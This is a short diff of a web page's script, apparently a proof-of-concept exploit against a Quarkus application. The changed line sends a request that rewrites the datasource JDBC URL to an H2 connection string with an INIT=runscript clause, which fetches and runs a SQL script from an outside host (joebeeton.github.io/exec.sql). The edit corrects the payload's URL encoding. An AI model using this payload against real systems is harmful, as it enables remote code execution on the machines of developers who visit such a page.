@@ -22,7 +22,7 @@
       };
 
       xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-      xhr.send("action=updateProperty&name=quarkus.datasource.jdbc.url&value=jdbc%3Ah2%3Amem%3Atestdb%3BINIT%3Drunscript+from+'https%3A%2F%joebeeton.github.io%3A8081%2Fexec.sql'");
+      xhr.send("action=updateProperty&name=quarkus.datasource.jdbc.url&value=jdbc:h2:mem:testdb;INIT=runscript+from+'https://joebeeton.github.io/exec.sql'");
 
     }
     </script>
